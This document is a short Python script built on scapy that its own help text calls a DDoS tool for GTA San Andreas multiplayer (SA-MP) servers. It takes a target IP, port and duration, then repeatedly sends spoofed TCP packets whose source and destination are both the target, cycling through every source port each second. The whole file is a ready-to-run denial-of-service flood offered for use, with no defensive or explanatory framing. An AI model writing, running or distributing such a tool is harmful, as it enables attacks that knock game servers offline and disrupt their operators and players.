from scapy.all import *
import argparse
import time

def attack(target_ip, target_port, duration):
    print(f"[+] Attacking {target_ip}:{target_port} for {duration} seconds.")

    for _ in range(duration):
        for src_port in range(1024, 65535):
            IP_packet = IP(src=target_ip, dst=target_ip)
            TCP_packet = TCP(sport=src_port, dport=target_port)

            packet = IP_packet / TCP_packet
            send(packet, verbose=False)

        time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description="A GTA SA-MP DDoS tool using Python 3.")
    parser.add_argument("target_ip", type=str, help="The target IP address.")
    parser.add_argument("target_port", type=int, help="The target port number.")
    parser.add_argument("-d", "--duration", type=int, default=60, help="The duration of the attack in seconds. Default is 60 seconds.")

    args = parser.parse_args()

    attack(args.target_ip, args.target_port, args.duration)

if __name__ == "__main__":
    main()